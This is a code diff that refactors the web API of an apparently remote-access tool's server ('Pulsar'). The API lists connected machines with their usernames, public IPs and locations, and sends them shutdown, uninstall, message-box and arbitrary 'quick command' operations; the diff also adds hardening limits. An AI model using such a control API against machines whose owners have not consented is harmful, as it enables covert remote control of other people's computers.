@@ -1,14 +1,10 @@
-#if NET48
 using Microsoft.AspNetCore.Builder;
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.AspNetCore.Http;
 using Microsoft.Extensions.Logging;
-using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
-using Pulsar.Common.Messages.Administration.Actions;
-using Pulsar.Common.Messages.ClientManagement;
-using Pulsar.Common.Messages.QuickCommands;
-using Pulsar.Common.Messages.UserSupport.MessageBox;
+using Pulsar.Common.Networking;
+using Pulsar.Server.Operations;
 using Pulsar.Server.Persistence;
 using Pulsar.Server.Utilities;
 using System;
@@ -34,13 +30,15 @@ namespace Pulsar.Server.Networking.WebApi
     {
         private const int LogBufferSize = 200;
         private const int SseHeartbeatMs = 15000;
+        private const int MaxSseSubscribers = 64;
+        private const long MaxRequestBodyBytes = 512 * 1024;
+        private const long MaxAutoTasksFileBytes = 4 * 1024 * 1024;
 
-        private readonly Func<Client[]> _getClients;
+        private readonly ClientOperationService _operations;
         private readonly Action<string, string> _log;
+        private readonly bool _logCallbackPublishes;
         private readonly string _autoTasksFilePath;
         private WebApplication _app;
-        private Task _runTask;
-
         // SSE hub
         private readonly object _sseLock = new object();
         private readonly List<SseSubscriber> _sseSubscribers = new List<SseSubscriber>();
@@ -67,8 +65,19 @@ namespace Pulsar.Server.Networking.WebApi
 
         public WebApiServer(Func<Client[]> getClients, Action<string, string> log, string autoTasksFilePath = null)
         {
-            _getClients = getClients ?? throw new ArgumentNullException(nameof(getClients));
             _log = log;
+            _logCallbackPublishes = false;
+            _autoTasksFilePath = autoTasksFilePath;
+            _operations = new ClientOperationService(
+                getClients ?? throw new ArgumentNullException(nameof(getClients)), Log);
+        }
+
+        public WebApiServer(ClientOperationService operations, Action<string, string> log,
+            string autoTasksFilePath = null, bool logCallbackPublishes = false)
+        {
+            _operations = operations ?? throw new ArgumentNullException(nameof(operations));
+            _log = log;
+            _logCallbackPublishes = logCallbackPublishes;
             _autoTasksFilePath = autoTasksFilePath;
         }
 
@@ -95,11 +104,18 @@ namespace Pulsar.Server.Networking.WebApi
                     Args = Array.Empty<string>()
                 });
                 builder.Logging.ClearProviders();
-                builder.WebHost.ConfigureKestrel(options => options.ListenAnyIP(port));
+                builder.WebHost.ConfigureKestrel(options =>
+                {
+                    options.ListenAnyIP(port);
+                    options.Limits.MaxRequestBodySize = MaxRequestBodyBytes;
+                    options.Limits.MaxRequestHeadersTotalSize = 32 * 1024;
+                    options.Limits.MaxConcurrentConnections = 256;
+                    options.Limits.KeepAliveTimeout = TimeSpan.FromMinutes(1);
+                });
 
                 var app = builder.Build();
                 Configure(app, apiKey);
-                _runTask = app.RunAsync();
+                app.StartAsync().GetAwaiter().GetResult();
 
                 _app = app;
                 _sseHeartbeat = new Timer(SendHeartbeat, null, SseHeartbeatMs, SseHeartbeatMs);
@@ -132,6 +148,7 @@ namespace Pulsar.Server.Networking.WebApi
                         !CryptographicOperations.FixedTimeEquals(
                             SHA256.HashData(Encoding.UTF8.GetBytes(provided)), expected))
                     {
+                        Log("[Web API] Rejected an unauthenticated API request.", "warning");
                         ctx.Response.StatusCode = StatusCodes.Status401Unauthorized;
                         await ctx.Response.WriteAsync("invalid or missing X-Api-Key header");
                         return;
@@ -151,21 +168,48 @@ namespace Pulsar.Server.Networking.WebApi
                 Results.Json(new { version = ServerVersion.Display, api = 2 }));
 
             app.MapGet("/api/stats", () =>
-                Results.Json(new
+            {
+                try
                 {
-                    connected = GetClients().Length,
-                    version = ServerVersion.Display
-                }));
+                    return Results.Json(new
+                    {
+                        connected = _operations.GetClientList().Length,
+                        version = ServerVersion.Display
+                    });
+                }
+                catch
+                {
+                    return Results.Json(new { error = "client data is unavailable" }, statusCode: 503);
+                }
+            });
 
             app.MapGet("/api/clients", () =>
-                Results.Json(GetClients().Select(ProjectClient).ToArray()));
+            {
+                try
+                {
+                    return Results.Json(_operations.GetClientList());
+                }
+                catch
+                {
+                    Log("[Web API] Client-list query failed.", "error");
+                    return Results.Json(new { error = "client data is unavailable" }, statusCode: 503);
+                }
+            });
 
             app.MapGet("/api/clients/{id}", (string id) =>
             {
-                var client = FindClient(id);
-                return client == null
-                    ? NotFound()
-                    : Results.Json(ProjectClient(client));
+                try
+                {
+                    var client = _operations.GetClientDetail(id);
+                    return client == null
+                        ? NotFound()
+                        : Results.Json(client);
+                }
+                catch
+                {
+                    Log("[Web API] Client-detail query failed.", "error");
+                    return Results.Json(new { error = "client data is unavailable" }, statusCode: 503);
+                }
             });
 
             // previously seen clients (SQLite repository), online flag included
@@ -174,27 +218,12 @@ namespace Pulsar.Server.Networking.WebApi
                 try
                 {
                     var all = OfflineClientRepository.GetAllClients();
-                    return Results.Json(all.Select(r => new
-                    {
-                        id = r.ClientId,
-                        userAtPc = r.UserAtPc,
-                        username = r.Username,
-                        pcName = r.PcName,
-                        publicIp = r.PublicIP,
-                        tag = r.Tag,
-                        country = r.Country,
-                        countryCode = r.CountryCode,
-                        operatingSystem = r.OperatingSystem,
-                        version = r.Version,
-                        accountType = r.AccountType,
-                        online = r.IsOnline,
-                        firstSeenUtc = r.FirstSeenUtc,
-                        lastSeenUtc = r.LastSeenUtc
-                    }).ToArray());
+                    return Results.Json(all.Select(ClientOperationService.Project).ToArray());
                 }
                 catch
                 {
-                    return Results.Json(new object[] { });
+                    Log("[Web API] Known-client query failed.", "error");
+                    return Results.Json(new { error = "client data is unavailable" }, statusCode: 503);
                 }
             });
 
@@ -203,21 +232,12 @@ namespace Pulsar.Server.Networking.WebApi
                 try
                 {
                     var offline = OfflineClientRepository.GetClientsByOnlineState(false);
-                    return Results.Json(offline.Select(r => new
-                    {
-                        id = r.ClientId,
-                        userAtPc = r.UserAtPc,
-                        tag = r.Tag,
-                        publicIp = r.PublicIP,
-                        country = r.Country,
-                        operatingSystem = r.OperatingSystem,
-                        version = r.Version,
-                        lastSeenUtc = r.LastSeenUtc
-                    }).ToArray());
+                    return Results.Json(offline.Select(ClientOperationService.Project).ToArray());
                 }
                 catch
                 {
-                    return Results.Json(new object[] { });
+                    Log("[Web API] Offline-client query failed.", "error");
+                    return Results.Json(new { error = "client data is unavailable" }, statusCode: 503);
                 }
             });
 
@@ -251,16 +271,26 @@ namespace Pulsar.Server.Networking.WebApi
                 var subscriber = new SseSubscriber { Context = ctx };
                 lock (_sseLock)
                 {
+                    if (_sseSubscribers.Count >= MaxSseSubscribers)
+                    {
+                        ctx.Response.StatusCode = StatusCodes.Status429TooManyRequests;
+                        return;
+                    }
                     _sseSubscribers.Add(subscriber);
                 }
 
                 try
                 {
+                    var clients = _operations.GetClientList();
                     await WriteSseData(subscriber, JsonSerializer.Serialize(new
                     {
                         type = "hello",
                         timestampUtc = DateTime.UtcNow,
-                        data = new { connected = GetClients().Length }
+                        data = new
+                        {
+                            connected = clients.Length,
+                            clients
+                        }
                     }));
                     await WriteSseRaw(subscriber, "retry: 5000\n\n");
 
@@ -284,49 +314,41 @@ namespace Pulsar.Server.Networking.WebApi
             });
 
             MapClientAction(app, "/api/clients/{id}/shutdown",
-                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown }));
+                ClientOperation.Shutdown);
             MapClientAction(app, "/api/clients/{id}/restart",
-                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Restart }));
+                ClientOperation.Restart);
             MapClientAction(app, "/api/clients/{id}/standby",
-                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Standby }));
+                ClientOperation.Standby);
             MapClientAction(app, "/api/clients/{id}/lockscreen",
-                c => c.Send(new DoShutdownAction { Action = ShutdownAction.Lockscreen }));
-            MapClientAction(app, "/api/clients/{id}/reconnect", c => c.Send(new DoClientReconnect()));
-            MapClientAction(app, "/api/clients/{id}/disconnect", c => c.Send(new DoClientDisconnect()));
-            MapClientAction(app, "/api/clients/{id}/uninstall", c => c.Send(new DoClientUninstall()));
+                ClientOperation.Lockscreen);
+            MapClientAction(app, "/api/clients/{id}/reconnect", ClientOperation.Reconnect);
+            MapClientAction(app, "/api/clients/{id}/disconnect", ClientOperation.Disconnect);
+            MapClientAction(app, "/api/clients/{id}/uninstall", ClientOperation.Uninstall);
 
             app.MapPost("/api/clients/{id}/quickcommand", (string id, QuickCommandRequest body) =>
             {
-                if (string.IsNullOrWhiteSpace(body?.Command))
-                    return Results.Json(new { error = "command is required" }, statusCode: 400);
-
-                var client = FindClient(id);
-                if (client == null)
-                    return NotFound();
-
-                client.Send(new DoSendQuickCommand { Command = body.Command, Host = body.Host });
-                Log($"[Web API] Quick command sent to {client.Value?.UserAtPc}", "normal");
-                return Results.Json(new { sent = true });
+                var request = new ClientOperationRequest
+                {
+                    ClientId = id,
+                    Operation = ClientOperation.QuickCommand,
+                    Command = body?.Command,
+                    Host = body?.Host
+                };
+                return ToHttpResult(_operations.Execute(request, "web api"));
             });
 
             app.MapPost("/api/clients/{id}/messagebox", (string id, MessageBoxRequest body) =>
             {
-                if (string.IsNullOrWhiteSpace(body?.Text))
-                    return Results.Json(new { error = "text is required" }, statusCode: 400);
-
-                var client = FindClient(id);
-                if (client == null)
-                    return NotFound();
-
-                client.Send(new DoShowMessageBox
+                var request = new ClientOperationRequest
                 {
-                    Caption = body.Caption,
-                    Text = body.Text,
-                    Button = string.IsNullOrEmpty(body.Button) ? "OK" : body.Button,
-                    Icon = string.IsNullOrEmpty(body.Icon) ? "Information" : body.Icon
-                });
-                Log($"[Web API] Message box sent to {client.Value?.UserAtPc}", "normal");
-                return Results.Json(new { sent = true });
+                    ClientId = id,
+                    Operation = ClientOperation.MessageBox,
+                    Caption = body?.Caption,
+                    Text = body?.Text,
+                    Button = body?.Button,
+                    Icon = body?.Icon
+                };
+                return ToHttpResult(_operations.Execute(request, "web api"));
             });
         }
 
@@ -399,7 +421,10 @@ namespace Pulsar.Server.Networking.WebApi
             await subscriber.WriteLock.WaitAsync();
             try
             {
-                await subscriber.Context.Response.WriteAsync(raw);
+                await subscriber.Context.Response.WriteAsync(
+                    raw, subscriber.Context.RequestAborted);
+                await subscriber.Context.Response.Body.FlushAsync(
+                    subscriber.Context.RequestAborted);
             }
             finally
             {
@@ -444,8 +469,10 @@ namespace Pulsar.Server.Networking.WebApi
 
         private void Log(string message, string level)
         {
+            if (!_logCallbackPublishes)
+                PublishLog(message, level);
+
             _log?.Invoke(message, level);
-            PublishLog(message, level);
         }
 
         private static string LoadDashboardHtml()
@@ -475,8 +502,15 @@ namespace Pulsar.Server.Networking.WebApi
                 if (string.IsNullOrEmpty(_autoTasksFilePath) || !File.Exists(_autoTasksFilePath))
                     return Results.Json(new object[] { });
 
+                var file = new FileInfo(_autoTasksFilePath);
+                if (file.Length > MaxAutoTasksFileBytes)
+                    return Results.Json(new { error = "auto-task data is unavailable" }, statusCode: 503);
+
                 string json = File.ReadAllText(_autoTasksFilePath);
                 var tasks = Newtonsoft.Json.JsonConvert.DeserializeObject<List<Forms.AutoTask>>(json);
+                if ((tasks?.Count ?? 0) > MessageInputLimits.MaxCollectionItems)
+                    return Results.Json(new { error = "auto-task data is unavailable" }, statusCode: 503);
+
                 return Results.Json((tasks ?? new List<Forms.AutoTask>()).Select(t => new
                 {
                     title = t.Title,
@@ -488,54 +522,66 @@ namespace Pulsar.Server.Networking.WebApi
                     param4 = t.Param4
                 }).ToArray());
             }
-            catch (Exception ex)
+            catch
             {
-                return Results.Json(new { error = ex.Message }, statusCode: 500);
+                Log("[Web API] Auto-task query failed.", "error");
+                return Results.Json(new { error = "auto-task data is unavailable" }, statusCode: 503);
             }
         }
 
-        private void MapClientAction(WebApplication app, string pattern, Action<Client> send)
+        private void MapClientAction(WebApplication app, string pattern, ClientOperation operation)
         {
             app.MapPost(pattern, (string id) =>
             {
-                var client = FindClient(id);
-                if (client == null)
-                    return NotFound();
-
-                send(client);
-                return Results.Json(new { sent = true });
+                return ToHttpResult(_operations.Execute(new ClientOperationRequest
+                {
+                    ClientId = id,
+                    Operation = operation
+                }, "web api"));
             });
         }
 
         private Client[] GetClients()
         {
-            return _getClients() ?? Array.Empty<Client>();
+            return _operations.GetClients();
         }
 
-        private Client FindClient(string id)
+        private static IResult ToHttpResult(ClientOperationResult result)
         {
-            return GetClients().FirstOrDefault(c =>
-                string.Equals(c.Value?.Id, id, StringComparison.OrdinalIgnoreCase));
+            if (result.Accepted)
+            {
+                return Results.Json(new
+                {
+                    sent = true,
+                    accepted = true,
+                    operation = result.Operation.ToString().ToLowerInvariant(),
+                    clientId = result.ClientId
+                });
+            }
+
+            int status = result.Status switch
+            {
+                ClientOperationStatus.InvalidRequest => 400,
+                ClientOperationStatus.NotFound => 404,
+                ClientOperationStatus.Offline => 409,
+                ClientOperationStatus.Rejected => 409,
+                ClientOperationStatus.Unavailable => 503,
+                _ => 500
+            };
+
+            return Results.Json(new
+            {
+                sent = false,
+                accepted = false,
+                operation = result.Operation.ToString().ToLowerInvariant(),
+                clientId = result.ClientId,
+                error = result.Error
+            }, statusCode: status);
         }
 
         private static IResult NotFound() => Results.Json(new { error = "client not found" }, statusCode: 404);
 
-        private static object ProjectClient(Client c) => new
-        {
-            id = c.Value?.Id,
-            userAtPc = c.Value?.UserAtPc,
-            username = c.Value?.Username,
-            pcName = c.Value?.PcName,
-            publicIp = c.Value?.PublicIP,
-            country = c.Value?.Country,
-            countryCode = c.Value?.CountryCode,
-            tag = c.Value?.Tag,
-            operatingSystem = c.Value?.OperatingSystem,
-            version = c.Value?.Version,
-            accountType = c.Value?.AccountType,
-            endPoint = c.EndPoint?.ToString(),
-            connected = c.Connected
-        };
+        private static object ProjectClient(Client client) => ClientOperationService.Project(client);
 
         #endregion
 
@@ -563,10 +609,7 @@ namespace Pulsar.Server.Networking.WebApi
 
             try { _app.StopAsync().GetAwaiter().GetResult(); } catch { }
             try { _app.DisposeAsync().AsTask().GetAwaiter().GetResult(); } catch { }
-            try { _runTask?.GetAwaiter().GetResult(); } catch { }
-
             _app = null;
-            _runTask = null;
             Running = false;
         }
     }
@@ -580,4 +623,3 @@ namespace Pulsar.Server.Networking.WebApi
         }
     }
 }
-#endif
